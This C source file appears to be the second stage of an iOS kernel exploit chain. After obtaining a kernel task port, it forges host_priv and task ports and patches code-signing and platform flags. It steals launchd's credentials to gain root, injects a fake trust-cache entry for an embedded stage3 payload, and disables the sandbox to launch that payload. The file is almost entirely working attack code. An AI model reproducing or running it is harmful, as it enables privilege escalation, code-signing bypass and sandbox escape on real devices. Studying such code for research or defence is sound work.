#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include "common.h"
#include "time_saved/time_saved.h"
#include <asl.h>
#include <CoreFoundation/CoreFoundation.h>
#include <CommonCrypto/CommonDigest.h>
#include <sys/stat.h>
#include <mach-o/loader.h>
#include <mach-o/fat.h>
#include <spawn.h>
#include "stage3.h"

char stage3_path[1024];

extern mach_port_t tfpzero;
extern uint64_t kernel_slide;

extern uint64_t self_struct_proc;
extern uint64_t kern_struct_proc;
extern uint64_t launchd_struct_proc;


uint64_t IPCSpaceKernel() {
    return rk64(find_port(mach_task_self()) + 0x60);
}

const uint64_t kernel_address_space_base = 0xffff000000000000;
void Kernel_memcpy(uint64_t dest, uint64_t src, uint32_t length) {
    if (dest >= kernel_address_space_base) {
        // copy to kernel:
        kwrite(dest, (void*) src, length);
    } else {
        // copy from kernel
        kread(src, (void*)dest, length);
    }
}

bool PatchHostPriv(mach_port_t host) {
    
#define IO_ACTIVE 0x80000000
#define IKOT_HOST_PRIV 4
    
    // locate port in kernel
    uint64_t host_kaddr = find_port(host);
    
    // change port host type
    uint32_t old = rk32(host_kaddr + 0x0);
    // printf("[-] Old host type: 0x%x\n", old);
    
    wk32(host_kaddr + 0x0, IO_ACTIVE | IKOT_HOST_PRIV);
    
    uint32_t new = rk32(host_kaddr);
    // printf("[-] New host type: 0x%x\n", new);
    
    return ((IO_ACTIVE | IKOT_HOST_PRIV) == new) ? true : false;
}

mach_port_t FakeHostPriv_port = MACH_PORT_NULL;
// build a fake host priv port
mach_port_t FakeHostPriv() {
    if (FakeHostPriv_port != MACH_PORT_NULL) {
        return FakeHostPriv_port;
    }
    // get the address of realhost:
    uint64_t hostport_addr = find_port(mach_host_self());
    uint64_t realhost = rk64(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    // allocate a port
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (err != KERN_SUCCESS) {
        // printf("[-] failed to allocate port\n");
        return MACH_PORT_NULL;
    }
    // get a send right
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    // make sure port type has IKOT_HOST_PRIV
    PatchHostPriv(port);
    
    // locate the port
    uint64_t port_addr = find_port(port);

    // change the space of the port
    wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), IPCSpaceKernel());
    
    // set the kobject
    wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), realhost);
    
    FakeHostPriv_port = port;
    
    return port;
}

void convertPortToTaskPort(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
    // now make the changes to the port object to make it a task port:
    uint64_t port_kaddr = find_port(port);
    
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), 0x80000000 | 2);
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
    
    // swap our receive right for a send right:
    uint64_t task_port_addr = find_port(mach_task_self());
    uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint32_t bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
    
#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
    
    bits &= (~IE_BITS_RECEIVE);
    bits |= IE_BITS_SEND;
    
    wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
}

void MakePortFakeTaskPort(mach_port_t port, uint64_t task_kaddr) {
    convertPortToTaskPort(port, IPCSpaceKernel(), task_kaddr);
}

uint64_t Kernel_alloc_wired(uint64_t size) {
    if (tfpzero == MACH_PORT_NULL) {\
        return 0;
    }
    
    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);
    
    // printf("[*] vm_kernel_page_size: %lx\n", vm_kernel_page_size);
    
    err = mach_vm_allocate(tfpzero, &addr, ksize+0x4000, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {\
        return 0;
    }
    
    // printf("[+] allocated address: %llx\n", addr);
    
    addr += 0x3fff;
    addr &= ~0x3fffull;
    
    // printf("[*] address to wire: %llx\n", addr);
    
    err = mach_vm_wire(FakeHostPriv(), tfpzero, addr, ksize, VM_PROT_READ|VM_PROT_WRITE);
    if (err != KERN_SUCCESS) {\
        return 0;
    }
    return addr;
}


uint64_t make_fake_task(uint64_t vm_map) {
    uint64_t fake_task_kaddr = Kernel_alloc_wired(0x1000);

    void* fake_task = malloc(0x1000);
    memset(fake_task, 0, 0x1000);
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
    Kernel_memcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
    free(fake_task);

    return fake_task_kaddr;
}

typedef char hash_t[20];

struct trust_chain {
    uint64_t next;
    unsigned char uuid[16];
    unsigned int count;
} __attribute__((packed));

#define MACHO(p) ((*(unsigned int *)(p) & ~1) == 0xfeedface)

uint32_t swap_uint32( uint32_t val ) {
    val = ((val << 8) & 0xFF00FF00 ) | ((val >> 8) & 0xFF00FF );
    return (val << 16) | (val >> 16);
}

uint32_t read_magic(FILE* file, off_t offset) {
    uint32_t magic;
    fseek(file, offset, SEEK_SET);
    fread(&magic, sizeof(uint32_t), 1, file);
    return magic;
}

void *load_bytes(FILE *file, off_t offset, size_t size) {
    void *buf = calloc(1, size);
    fseek(file, offset, SEEK_SET);
    fread(buf, size, 1, file);
    return buf;
}

void getSHA256inplace(const uint8_t* code_dir, uint8_t *out) {
    // if (code_dir == NULL) {
    //     printf("NULL passed to getSHA256inplace!\n");
    //     return;
    // }
    uint32_t* code_dir_int = (uint32_t*)code_dir;
    
    uint32_t realsize = 0;
    for (int j = 0; j < 10; j++) {
        if (swap_uint32(code_dir_int[j]) == 0xfade0c02) {
            realsize = swap_uint32(code_dir_int[j+1]);
            code_dir += 4*j;
        }
    }
    
    CC_SHA256(code_dir, realsize, out);
}

uint8_t *getCodeDirectory(const char* name) {
    
    FILE* fd = fopen(name, "r");
    
    uint32_t magic;
    fread(&magic, sizeof(magic), 1, fd);
    fseek(fd, 0, SEEK_SET);
    
    long off = 0, file_off = 0;
    int ncmds = 0;
    // bool foundarm64 = false;
    
    if (magic == MH_MAGIC_64) { // 0xFEEDFACF
        struct mach_header_64 mh64;
        fread(&mh64, sizeof(mh64), 1, fd);
        off = sizeof(mh64);
        ncmds = mh64.ncmds;
    } else {
      fclose(fd);
      return NULL;
    }
    // else if (magic == MH_MAGIC) {
    //     printf("[-] %s is 32bit. What are you doing here?\n", name);
    //     fclose(fd);
    //     return NULL;
    // }
    // else if (magic == 0xBEBAFECA) { //FAT binary magic
        
    //     size_t header_size = sizeof(struct fat_header);
    //     size_t arch_size = sizeof(struct fat_arch);
    //     size_t arch_off = header_size;
        
    //     struct fat_header *fat = (struct fat_header*)load_bytes(fd, 0, header_size);
    //     struct fat_arch *arch = (struct fat_arch *)load_bytes(fd, arch_off, arch_size);
        
    //     int n = swap_uint32(fat->nfat_arch);
    //     printf("[*] Binary is FAT with %d architectures\n", n);
        
    //     while (n-- > 0) {
    //         magic = read_magic(fd, swap_uint32(arch->offset));
            
    //         if (magic == 0xFEEDFACF) {
    //             printf("[*] Found arm64\n");
    //             foundarm64 = true;
    //             struct mach_header_64* mh64 = (struct mach_header_64*)load_bytes(fd, swap_uint32(arch->offset), sizeof(struct mach_header_64));
    //             file_off = swap_uint32(arch->offset);
    //             off = swap_uint32(arch->offset) + sizeof(struct mach_header_64);
    //             ncmds = mh64->ncmds;
    //             break;
    //         }
            
    //         arch_off += arch_size;
    //         arch = load_bytes(fd, arch_off, arch_size);
    //     }
        
    //     if (!foundarm64) { // by the end of the day there's no arm64 found
    //         printf("[-] No arm64? RIP\n");
    //         fclose(fd);
    //         return NULL;
    //     }
    // }
    // else {
    //     printf("[-] %s is not a macho! (or has foreign endianness?) (magic: %x)\n", name, magic);
    //     fclose(fd);
    //     return NULL;
    // }
    
    for (int i = 0; i < ncmds; i++) {
        struct load_command cmd;
        fseek(fd, off, SEEK_SET);
        fread(&cmd, sizeof(struct load_command), 1, fd);
        if (cmd.cmd == LC_CODE_SIGNATURE) {
            uint32_t off_cs;
            fread(&off_cs, sizeof(uint32_t), 1, fd);
            uint32_t size_cs;
            fread(&size_cs, sizeof(uint32_t), 1, fd);
            
            uint8_t *cd = malloc(size_cs);
            fseek(fd, off_cs + file_off, SEEK_SET);
            fread(cd, size_cs, 1, fd);
            fclose(fd);
            return cd;
        } else {
            off += cmd.cmdsize;
        }
    }
    fclose(fd);
    return NULL;
}

int trustbin(const char *path) {
    // printf("[*] Will trust %s\n", path);
    // [paths addObject:@(path)];
    
    int rv;
    int fd;
    uint8_t *p;
    off_t sz;
    struct stat st;
    uint8_t buf[16];
    
    // if (strtail(path, ".plist") == 0 || strtail(path, ".nib") == 0 || strtail(path, ".strings") == 0 || strtail(path, ".png") == 0) {
    //     printf("[-] Binary not an executable! Kernel doesn't like trusting data, geez\n");
    //     return 2;
    // }
    
    rv = lstat(path, &st);
    if (rv || !S_ISREG(st.st_mode) || st.st_size < 0x4000) {
        // printf("[-] Binary too big\n");
        return 3;
    }
    
    fd = open(path, O_RDONLY);
    // if (fd < 0) {
    //     printf("[-] Don't have permission to open file\n");
    //     return 4;
    // }
    
    sz = read(fd, buf, sizeof(buf));
    // if (sz != sizeof(buf)) {
    //     close(fd);
    //     printf("[-] Failed to read from binary\n");
    //     return 5;
    // }
    // if (*(uint32_t *)buf != 0xBEBAFECA && !MACHO(buf)) {
    //     close(fd);
    //     printf("[-] Binary not a macho!\n");
    //     return 6;
    // }
    
    p = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (p == MAP_FAILED) {
        close(fd);
        // printf("[-] Failed to mmap file\n");
        return 7;
    }
    
    uint64_t trust_chain = (kernel_slide + koffset(KOFFSET_TRUSTCACHE));
    
    // printf("[*] trust_chain at 0x%llx\n", trust_chain);
    
    struct trust_chain fake_chain;
    fake_chain.next = rk64(trust_chain);
    //((uint64_t*)fake_chain.uuid)[0] = 0xbadbabeabadbabe;
    //((uint64_t*)fake_chain.uuid)[1] = 0xbadbabeabadbabe;
    
    arc4random_buf(fake_chain.uuid, 16);

    int cnt = 0;
    uint8_t hash[CC_SHA256_DIGEST_LENGTH];
    hash_t *allhash = malloc(sizeof(hash_t) * 1);
    uint8_t *cd = getCodeDirectory((char*)path);
    if (cd != NULL) {
        getSHA256inplace(cd, hash);
        memmove(allhash[cnt], hash, sizeof(hash_t));
        ++cnt;
    }
    // for (int i = 0; i != [paths count]; ++i) {
    //     uint8_t *cd = getCodeDirectory((char*)[[paths objectAtIndex:i] UTF8String]);
    //     if (cd != NULL) {
    //         getSHA256inplace(cd, hash);
    //         memmove(allhash[cnt], hash, sizeof(hash_t));
    //         ++cnt;
    //     }
    //     else {
    //         printf("[-] CD NULL\n");
    //         continue;
    //     }
    // }
    
    fake_chain.count = cnt;
    
    size_t length = (sizeof(fake_chain) + cnt * sizeof(hash_t) + 0x3FFF) & ~0x3FFF;
    uint64_t kernel_trust = kalloc(length);
    // printf("[*] allocated: 0x%zx => 0x%llx\n", length, kernel_trust);
    
    kwrite(kernel_trust, &fake_chain, sizeof(fake_chain));
    kwrite(kernel_trust + sizeof(fake_chain), allhash, cnt * sizeof(hash_t));
    
    wk64(trust_chain, kernel_trust);
    
    free(allhash);
    
    return 0;
}

int extract_stage3(void) {
  memset(stage3_path, 0, 1024);
// size_t len = confstr(_CS_DARWIN_USER_TEMP_DIR, stage3_path, sizeof(stage3_path));
// strcat(stage3_path, "stage3");
strcpy(stage3_path, "/var/containers/Bundle/stage3");

// NSLog(@"[stage2] stage3_path = %s", stage3_path);
remove(stage3_path);
FILE *f = fopen(stage3_path, "wb");
// if (!f) {
//   perror("[stage2] Failed to open file for writing");
//   return 1;
// }

/* 반복문 없이 한 번에 전체 버퍼를 기록 */
size_t total_size = sizeof(stage3);
fwrite(stage3, 1, total_size, f);

fclose(f);
asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] Wrote stage3.dylib (%zu bytes), stage3_path = %s", total_size, stage3_path);

return 0;
}

int launch(char *binary, char *arg1, char *arg2, char *arg3, char *arg4, char *arg5, char *arg6, char**env) {
    pid_t pd;
    const char* args[] = {binary, arg1, arg2, arg3, arg4, arg5, arg6,  NULL};
    
    int rv = posix_spawn(&pd, binary, NULL, NULL, (char **)&args, env);
    asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] posix_spawn ret: %d", rv);
    if (rv) return rv;
    
    return 0;
    
    //int a = 0;
    //waitpid(pd, &a, 0);
    
    //return WEXITSTATUS(a);
}

int setHSP4() {
    // huge thanks to Siguza for hsp4 & v0rtex
    // for explainations and being a good rubber duck :p

    // see https://github.com/siguza/hsp4 for some background and explaination
    // tl;dr: there's a pointer comparison in convert_port_to_task_with_exec_token
    //   which makes it return TASK_NULL when kernel_task is passed
    //   "simple" vm_remap is enough to overcome this.

    // However, vm_remap has weird issues with submaps -- it either doesn't remap
    // or using remapped addresses leads to panics and kittens crying.

    // tasks fall into zalloc, so src_map is going to be zone_map
    // zone_map works perfectly fine as out zone -- you can
    // do remap with src/dst being same and get new address

    // however, using kernel_map makes more sense
    // we don't want zalloc to mess with our fake task
    // and neither

    // proper way to use vm_* APIs from userland is via mach_vm_*
    // but those accept task ports, so we're gonna set up
    // fake task, which has zone_map as its vm_map
    // then we'll build fake task port from that
    // and finally pass that port both as src and dst

    // last step -- wire new kernel task -- always a good idea to wire critical
    // kernel structures like tasks (or vtables :P )

    // and we can write our port to realhost.special[4]

    // we can use mach_host_self() if we're root
    
    mach_port_t mapped_tfp0 = MACH_PORT_NULL;
    mach_port_t *port = &mapped_tfp0;
    mach_port_t host_priv = FakeHostPriv();

    int ret;
    uint64_t remapped_task_addr = 0;
    // task is smaller than this but it works so meh
    uint64_t sizeof_task = 0x1000;

    uint64_t kernel_task_kaddr = kern_struct_task;

    mach_port_t zm_fake_task_port = MACH_PORT_NULL;
    mach_port_t km_fake_task_port = MACH_PORT_NULL;
    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);
    ret = ret || mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);

    if (ret == KERN_SUCCESS && *port == MACH_PORT_NULL) {
        ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port);
    }

    if (ret != KERN_SUCCESS) {
        // printf("[remap_kernel_task] unable to allocate ports: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }

    // strref \"Nothing being freed to the zone_map. start = end = %p\\n\"
    // or traditional \"zone_init: kmem_suballoc failed\"
    uint64_t zone_map_kptr = (kernel_slide + koffset(KOFFSET_ZONE_MAP_REF));//XXX Find_zone_map_ref();
    uint64_t zone_map = rk64(zone_map_kptr);

    // asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] 1");
    // sleep(2);

    // kernel_task->vm_map == kernel_map
    uint64_t kernel_map = rk64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
    // asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] 3.5 koffset(KOFFSET_ZONE_MAP_REF): 0x%llx, zone_map_kptr: 0x%llx, zone_map: 0x%llx, kernel_map: 0x%llx", koffset(KOFFSET_ZONE_MAP_REF), zone_map_kptr, zone_map, kernel_map);

    // asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] 2");
    // sleep(2);

    uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
    uint64_t km_fake_task_kptr = make_fake_task(kernel_map);

    // asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] 3");
    // sleep(2);

    MakePortFakeTaskPort(zm_fake_task_port, zm_fake_task_kptr);
    MakePortFakeTaskPort(km_fake_task_port, km_fake_task_kptr);

    km_fake_task_port = zm_fake_task_port;

    vm_prot_t cur, max;
    ret = mach_vm_remap(km_fake_task_port,
                        &remapped_task_addr,
                        sizeof_task,
                        0,
                        VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR,
                        zm_fake_task_port,
                        kernel_task_kaddr,
                        0,
                        &cur, &max,
                        VM_INHERIT_NONE);


    if (ret != KERN_SUCCESS) {
        // printf("[remap_kernel_task] remap failed: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }

    if (kernel_task_kaddr == remapped_task_addr) {
        // printf("[remap_kernel_task] remap failure: addr is the same after remap\n");
        return 1;
    }

    // printf("[remap_kernel_task] remapped successfully to 0x%llx\n", remapped_task_addr);

    ret = mach_vm_wire(host_priv, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE);

    if (ret != KERN_SUCCESS) {
        // printf("[remap_kernel_task] wire failed: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }

    uint64_t port_kaddr = find_port(*port);
    // printf("[remap_kernel_task] port kaddr: 0x%llx\n", port_kaddr);

    MakePortFakeTaskPort(*port, remapped_task_addr);

    if (rk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
        // printf("[remap_kernel_task] read back tfpzero kobject didnt match!\n");
        return 1;
    }

    // lck_mtx -- arm: 8  arm64: 16
    const int off_host_special = 0x10;
    uint64_t host_priv_kaddr = find_port(mach_host_self());
    uint64_t realhost_kaddr = rk64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    wk64(realhost_kaddr + off_host_special + 4 * sizeof(void*), port_kaddr);

    return 0;
  }

  #define TF_PLATFORM 0x400

#define    CS_VALID        0x0000001    /* dynamically valid */
#define CS_ADHOC        0x0000002    /* ad hoc signed */
#define CS_GET_TASK_ALLOW    0x0000004    /* has get-task-allow entitlement */
#define CS_INSTALLER        0x0000008    /* has installer entitlement */

#define    CS_HARD            0x0000100    /* don't load invalid pages */
#define    CS_KILL            0x0000200    /* kill process if it becomes invalid */
#define CS_CHECK_EXPIRATION    0x0000400    /* force expiration checking */
#define CS_RESTRICT        0x0000800    /* tell dyld to treat restricted */
#define CS_ENFORCEMENT        0x0001000    /* require enforcement */
#define CS_REQUIRE_LV        0x0002000    /* require library validation */
#define CS_ENTITLEMENTS_VALIDATED    0x0004000

#define    CS_ALLOWED_MACHO    0x00ffffe

#define CS_EXEC_SET_HARD    0x0100000    /* set CS_HARD on any exec'ed process */
#define CS_EXEC_SET_KILL    0x0200000    /* set CS_KILL on any exec'ed process */
#define CS_EXEC_SET_ENFORCEMENT    0x0400000    /* set CS_ENFORCEMENT on any exec'ed process */
#define CS_EXEC_SET_INSTALLER    0x0800000    /* set CS_INSTALLER on any exec'ed process */

#define CS_KILLED        0x1000000    /* was killed by kernel for invalidity */
#define CS_DYLD_PLATFORM    0x2000000    /* dyld used to load this is a platform binary */
#define CS_PLATFORM_BINARY    0x4000000    /* this is a platform binary */
#define CS_PLATFORM_PATH    0x8000000    /* platform binary by the fact of path (osx only) */

#define CS_DEBUGGED         0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */
#define CS_SIGNED         0x20000000  /* process has a signature (may have gone invalid) */
#define CS_DEV_CODE         0x40000000  /* code is dev signed, cannot be loaded into prod signed code (will go away with rdar://problem/28322552) */

void set_csflags(uint64_t proc) {
    uint32_t csflags = rk32(proc + 0x290);//offsetof_p_csflags);
    // NSLog(@"Previous CSFlags: 0x%x", csflags);
    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_DEBUGGED) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
    // NSLog(@"New CSFlags: 0x%x", csflags);
    wk32(proc + 0x290, csflags);
}

void set_tfplatform(uint64_t proc) {
    // task.t_flags & TF_PLATFORM
    uint64_t task = rk64(proc + 0x10);//offsetof_task);
    uint32_t t_flags = rk32(task + 0x390);//offsetof_t_flags);
    
    // NSLog(@"Old t_flags: 0x%x", t_flags);
    
    t_flags |= TF_PLATFORM;
    wk32(task+0x390, t_flags);
    
    // NSLog(@"New t_flags: 0x%x", t_flags);
    
}

int main() {
  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] loaded");

  // goto TEST;

  int tfpzero = start_time_saved();
  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] tfp0 = 0x%x, kslide: 0x%llx, kern_struct_task: 0x%llx", tfpzero, kernel_slide, kern_struct_task);

  //platformize
  set_csflags(self_struct_proc);
  set_tfplatform(self_struct_proc);

  //borrow launchd ucred
  uint64_t launchd_ucred = rk64(launchd_struct_proc + 0xf8);
  uint64_t self_ucred = rk64(self_struct_proc + 0xf8);
  wk64(self_struct_proc + 0xf8, launchd_ucred);

  //elevate
  setuid(0);
  setuid(0);

  //hsp4 patch
  setHSP4();
TEST:
  mach_port_t hsp4 = MACH_PORT_NULL;
  host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &hsp4);
  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] hsp4 = 0x%x", hsp4);

  //prepare stage3
  extract_stage3();
  int ret = trustbin(stage3_path);
  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] trustbin ret = 0x%x", ret);
  chmod(stage3_path, 0755);
  
  //restore ucred
  wk64(self_struct_proc + 0xf8, self_ucred);

  //unsandbox
  uint64_t saved_sb = rk64(rk64(self_ucred+0x78) + 8 + 8);
  wk64(rk64(self_ucred+0x78) + 8 + 8, 0);

  launch(stage3_path, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

  //restore sandbox
  wk64(rk64(self_ucred+0x78) + 8 + 8, saved_sb);

  sleep(5);


  return 0;
}

uint64_t entry[] = { MAGIC, (uint64_t)&main };
